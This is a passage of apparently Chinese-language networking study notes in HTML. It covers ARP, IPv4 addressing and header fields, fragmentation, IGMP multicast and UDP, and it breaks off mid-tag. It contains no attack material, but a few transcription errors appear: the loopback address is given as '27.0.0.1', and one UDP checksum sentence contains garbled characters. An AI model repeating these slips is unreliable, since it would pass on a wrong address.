112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/ARP封装.png" style="zoom:80%;" /></center><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote><h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote><h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/11/12/网际协议IP/UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" 